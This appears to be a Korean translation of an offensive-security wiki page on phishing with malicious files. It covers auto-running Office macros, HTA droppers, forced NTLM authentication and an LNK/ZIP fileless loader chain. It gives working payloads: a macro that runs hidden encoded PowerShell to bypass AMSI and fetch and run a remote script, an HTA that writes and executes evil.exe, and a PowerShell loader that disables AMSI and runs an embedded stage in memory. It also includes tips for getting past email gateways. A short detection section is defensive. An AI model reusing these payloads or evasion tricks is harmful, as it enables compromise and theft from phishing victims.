# 피싱 파일 및 문서

{{#include ../../banners/hacktricks-training.md}}

## Office 문서

Microsoft Word는 파일을 열기 전에 파일 데이터 유효성 검사를 수행합니다. 데이터 유효성 검사는 OfficeOpenXML 표준에 따라 데이터 구조 식별의 형태로 수행됩니다. 데이터 구조 식별 중 오류가 발생하면 분석 중인 파일은 열리지 않습니다.

일반적으로 매크로가 포함된 Word 파일은 `.docm` 확장자를 사용합니다. 그러나 파일 확장자를 변경해 이름을 바꿔도 매크로 실행 기능을 유지할 수 있습니다.\
예를 들어, RTF 파일은 설계상 매크로를 지원하지 않지만, DOCM 파일을 RTF로 이름을 바꾼 경우 Microsoft Word에서 처리되어 매크로를 실행할 수 있습니다.\
동일한 내부 구조와 메커니즘이 Microsoft Office Suite (Excel, PowerPoint 등)의 모든 소프트웨어에 적용됩니다.

You can use the following command to check which extensions are going to be executed by some Office programs:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX 파일이 원격 템플릿(File –Options –Add-ins –Manage: Templates –Go)을 참조하고, 해당 템플릿에 macros가 포함되어 있으면 문서에서 macros를 “실행”할 수도 있다.

### 외부 이미지 로드

이동: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

문서에서 macros를 사용해 임의의 코드를 실행하는 것이 가능하다.

#### Autoload functions

더 흔할수록 AV가 탐지할 가능성이 높아진다.

- AutoOpen()
- Document_Open()

#### Macros 코드 예시
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 메타데이터 수동 제거

**파일 > 정보 > 문서 검사 > 문서 검사**로 이동하면 문서 검사기가 나타납니다. **검사**를 클릭한 다음 **문서 속성 및 개인 정보** 옆의 **모두 제거**를 클릭하세요.

#### 문서 확장자

완료되면 **저장 형식** 드롭다운을 선택하고 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경하세요.\
이유는 **`.docx`** 안에는 매크로를 저장할 수 없고, 매크로가 활성화된 **`.docm`** 확장자에는 **낙인** **이 존재합니다**(예: 썸네일 아이콘에 큰 `!`가 표시되어 일부 웹/이메일 게이트웨이가 이를 완전히 차단합니다). 따라서 이 **레거시 `.doc` 확장자가 최선의 절충안입니다**.

#### 악성 매크로 생성기

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 파일

HTA는 **HTML 및 스크립트 언어(예: VBScript 및 JScript)를 결합하는** Windows 프로그램입니다. 사용자 인터페이스를 생성하고 브라우저의 보안 모델 제약 없이 "완전 신뢰" 애플리케이션으로 실행됩니다.

HTA는 **`mshta.exe`**를 사용해 실행되며, 이는 일반적으로 **설치되어** 있는 **Internet Explorer**와 함께 제공되어 **`mshta`가 IE에 의존**하게 됩니다. 따라서 Internet Explorer가 제거된 경우 HTA는 실행할 수 없습니다.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM 인증 강제

여러 방법으로 **NTLM 인증을 "원격으로" 강제**할 수 있습니다. 예를 들어, 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(심지어 HTTP MitM?). 또는 피해자에게 **폴더 열기만으로도** **인증을 유발**하는 **파일의 주소**를 보낼 수도 있습니다.

**다음 페이지들에서 이러한 아이디어들과 더 많은 내용을 확인하세요:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

hash 또는 authentication을 훔치는 것뿐만 아니라 **NTLM relay 공격을 수행할 수 있다는 점을 잊지 마세요**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

매우 효과적인 캠페인은 두 개의 합법적인 미끼 문서(PDF/DOCX)와 악성 .lnk를 포함한 ZIP을 배포합니다. 핵심은 실제 PowerShell 로더가 고유한 마커 뒤 ZIP의 원시 바이트에 저장되어 있고, .lnk가 이를 파싱하여 메모리에서 완전히 실행한다는 점입니다.

.lnk PowerShell one-liner가 구현하는 전형적인 흐름:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData%, 그리고 현재 작업 디렉터리의 부모 등 일반적인 경로에서 원본 ZIP을 찾는다.
2) ZIP 바이트를 읽어 하드코딩된 마커(예: xFIQCV)를 찾는다. 마커 이후의 모든 것이 임베디드된 PowerShell 페이로드이다.
3) ZIP을 %ProgramData%로 복사하고 그곳에서 압축을 풀며, 합법적으로 보이기 위해 미끼 .docx를 연다.
4) 현재 프로세스에서 AMSI를 우회: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 다음 단계의 난독화를 해제(예: 모든 # 문자 제거)하고 메모리에서 실행한다.

임베디드 스테이지를 추출하여 실행하기 위한 PowerShell 예시 골격:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
참고
- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may gate payloads (serve benign ZIPs based on IP/UA).
- 다음 단계에서는 종종 base64/XOR shellcode를 복호화한 후 디스크 흔적을 최소화하기 위해 Reflection.Emit + VirtualAlloc을 통해 실행합니다.

동일 체인에서 사용되는 Persistence
- Microsoft Web Browser control의 COM TypeLib hijacking으로 IE/Explorer나 이를 임베드한 앱이 페이로드를 자동으로 재실행하도록 합니다. 자세한 내용과 즉시 사용 가능한 명령은 다음에서 확인하세요:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- 아카이브 데이터 끝에 ASCII 마커 문자열(예: xFIQCV)이 추가된 ZIP 파일.
- .lnk가 상위/사용자 폴더를 열거하여 ZIP을 찾고 미끼 문서를 엽니다.
- AMSI 변조 via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- 신뢰된 PaaS 도메인에 호스팅된 링크로 끝나는 장시간 실행 비즈니스 스레드.

## 참고

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)

{{#include ../../banners/hacktricks-training.md}}
